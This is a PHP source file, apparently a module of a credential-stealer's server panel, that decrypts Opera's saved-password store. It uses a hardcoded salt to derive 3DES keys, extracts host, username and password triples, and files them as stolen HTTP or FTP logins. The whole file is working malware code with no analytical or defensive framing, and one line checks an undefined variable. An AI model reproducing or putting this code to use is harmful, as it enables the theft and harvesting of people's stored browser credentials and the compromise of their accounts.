<?php
//ok
class Module_opera extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $Stream = new Stream($Data);
            $OperaSalt = "837DFC0F8EB3E86973AFFF";
            $Version = $Stream->GetDWORD(FALSE); //v

            $Cnt = 0;
            $Host = $User = $Pass = '';
            while (TRUE)
            {
                if($Stream->GetDataLen() <= $Stream->GetDataPos() + 8)
                    break;

                $Stream->FindBytes(hex2bin("00000008"), 4);

                $BlockLen = $Stream->GetDWORD(FALSE);
                $BlockDes = $Stream->GetSTR($Stream->GetDWORD(FALSE));
                $DataLen  = $Stream->GetDWORD(FALSE);

                $DESKey1 = md5(hex2bin($OperaSalt) . $BlockDes, TRUE);
                $DESKey2 = md5($DESKey1 . hex2bin($OperaSalt) . $BlockDes, TRUE);

                $KEY = substr($DESKey1, 0, 8) . substr($DESKey1, 8, 8) . substr($DESKey2, 0, 8);
                $IV_ = substr($DESKey2, 8, 8);

                $Data = iconv('UTF-16LE', 'UTF-8', substr(mcrypt_decrypt(MCRYPT_3DES, $KEY, $Stream->GetSTR($DataLen), MCRYPT_MODE_CBC, $IV_), 0, $DataLen));

                if($Data[0] == ord(8) || $Data[0] == ord(0))
                {

                }
                else
                {

                    $Data = FixNonPrintable($Data);
                    if(strlen($Data) > 1)
                    {
                        if($Cnt > 0)
                            $Cnt++;
                        $OldCnt = $Cnt;
                        if(strstr($Data, "http://") || strstr($Data, "https://"))
                        {
                            if(!strstr($Data, "http://www.ecml.org"))
                                $Cnt = 1;
                        }

                        switch($Cnt)
                        {
                        case 1:
                            if($Version > 4)
                            {
                                if($OldCnt != 2)
                                {
                                    $Host = $Data;
                                }
                            }
                            else
                                $Host = $Data;

                            break;
                        case 3:
                            $User = $Data;
                            break;
                        case 5:
                            $Pass = $Data;

                            if (str_begins($Host, 'http://') || str_begins($Data_['Protocol'], 'https://'))
                                $this->add_http($Host, $User, $Pass);
                            else if(str_begins($Host, 'ftp://'))
                                $this->add_ftp($Host, $User, $Pass);

                            $Host = $User = $Pass = '';

                            $Cnt = 0;
                            break;
                        }
                    }

                }
            }
            $Stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
